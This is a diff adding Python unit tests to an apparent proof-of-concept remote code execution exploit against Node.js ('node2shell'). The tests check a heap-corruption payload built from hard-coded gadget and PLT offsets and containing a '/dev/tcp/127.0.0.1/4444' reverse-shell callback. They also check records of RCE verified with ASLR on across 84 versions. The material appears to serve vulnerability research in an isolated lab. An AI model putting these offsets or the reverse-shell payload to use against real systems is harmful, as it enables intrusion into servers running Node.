@@ -15,6 +15,13 @@ assert SPEC.loader is not None
 sys.modules[SPEC.name] = MODULE
 SPEC.loader.exec_module(MODULE)
 
+HEAP_PATH = ROOT / "poc" / "node2shell_heap.py"
+HEAP_SPEC = importlib.util.spec_from_file_location("node2shell_heap", HEAP_PATH)
+HEAP = importlib.util.module_from_spec(HEAP_SPEC)
+assert HEAP_SPEC.loader is not None
+sys.modules[HEAP_SPEC.name] = HEAP
+HEAP_SPEC.loader.exec_module(HEAP)
+
 
 class PocTests(unittest.TestCase):
     def test_trigger_fingerprint(self):
@@ -26,6 +33,13 @@ class PocTests(unittest.TestCase):
         self.assertNotIn(b"/bin/sh", stage)
         self.assertNotIn(b"/usr/bin/id", stage)
 
+    def test_ring_writer_uses_final_wrapped_prefix_occurrence(self):
+        controlled = bytearray(1031)
+        MODULE._write_ring(controlled, 0x3FC, b"ABCDEFGH", 0x400)
+        self.assertEqual(controlled[0x3FC:0x400], b"ABCD")
+        self.assertEqual(controlled[0x400:0x404], b"EFGH")
+        self.assertEqual(controlled[:4], b"\0" * 4)
+
     def test_verifier_requires_matching_process_token_and_id(self):
         token = b"a" * 32
         response = b"N2S-PROOF:" + token + b"\nuid=1000(node) gid=1000(node)\n"
@@ -34,6 +48,26 @@ class PocTests(unittest.TestCase):
         self.assertIsNone(MODULE.verify(b"N2S-PROOF:" + token, token))
         self.assertEqual(MODULE.classify_response(response, MODULE.verify(response, token)), "rce-proof")
         self.assertEqual(MODULE.classify_response(b"", None), "connection-closed-or-crash")
+
+    def test_heap_proof_is_fixed_to_loopback_and_id(self):
+        profile = HEAP.HeapProfile(
+            version="24.9.0",
+            node_binary_sha256="a" * 64,
+            bss_payload=0x6E948A0,
+            callback_gadget=0x1062840,
+            execvp_plt=0xF3ED60,
+            callback_pointer_offset=0x08,
+            context_pointer_offset=0x20,
+            poison_staged_position=-0x800A080,
+            record_size=0x330,
+            tcache_index=50,
+            ring_from_heap=0x800AB70,
+        )
+        payload = HEAP.build_fixed_proof(profile, "N2S_" + "b" * 32)
+        self.assertIn(b"/bin/bash\0", payload)
+        self.assertIn(b"/usr/bin/id", payload)
+        self.assertIn(b"/dev/tcp/127.0.0.1/4444", payload)
+        self.assertNotIn(b"host.docker.internal", payload)
 
     def test_stage_two_keeps_expected_corruption_fields(self):
         stage = MODULE.build_stage_two(0x137ED748, 256)
@@ -124,6 +158,49 @@ class PocTests(unittest.TestCase):
             summary["verification_mode"],
             "official-linux-x64-aslr-enabled-debugger-steered-isolated-docker",
         )
+
+    def test_aslr_network_only_evidence_is_complete_and_gdb_free(self):
+        direct_dir = ROOT / "evidence" / "matrix"
+        network_dir = ROOT / "evidence" / "aslr-on-network-only"
+        direct_paths = sorted(
+            path for path in direct_dir.glob("*.json") if path.name != "summary.json"
+        )
+        network_paths = sorted(
+            path for path in network_dir.glob("*.json") if path.name != "summary.json"
+        )
+        self.assertEqual(len(network_paths), 84)
+        self.assertEqual(
+            [path.stem for path in network_paths],
+            [path.stem for path in direct_paths],
+        )
+        token = re.compile(r"N2S_[0-9a-f]{32}")
+        for direct_path, network_path in zip(direct_paths, network_paths):
+            direct = json.loads(direct_path.read_text(encoding="utf-8"))
+            network = json.loads(network_path.read_text(encoding="utf-8"))
+            controls = network["lab_controls"]
+            self.assertEqual(network["version"], network_path.stem)
+            self.assertEqual(network["result"], "rce-verified", network_path.name)
+            self.assertEqual(network["node_binary_sha256"], direct["node_binary_sha256"])
+            self.assertEqual(
+                network["verification_mode"],
+                "official-linux-x64-aslr-enabled-network-only-worker-heap",
+            )
+            self.assertEqual(controls["kernel_randomize_va_space"], 2)
+            self.assertFalse(controls["debugger_used"])
+            self.assertFalse(controls["address_read_used"])
+            self.assertFalse(controls["ld_preload_present"])
+            self.assertEqual(controls["target"], "127.0.0.1:3000")
+            self.assertEqual(controls["callback"], "127.0.0.1:4444")
+            self.assertRegex(network["proof_token"], token)
+            self.assertRegex(network["proof_stdout"], r"^uid=\d+")
+            self.assertEqual(int(network["profile"]["bss_payload"], 0) & 0xF, 0)
+
+        summary = json.loads((network_dir / "summary.json").read_text(encoding="utf-8"))
+        self.assertTrue(summary["complete"])
+        self.assertEqual(summary["rce_verified_count"], 84)
+        self.assertEqual(summary["failed_or_unverified"], {})
+        self.assertFalse(summary["debugger_used"])
+        self.assertFalse(summary["address_read_used"])
 
 
 if __name__ == "__main__":
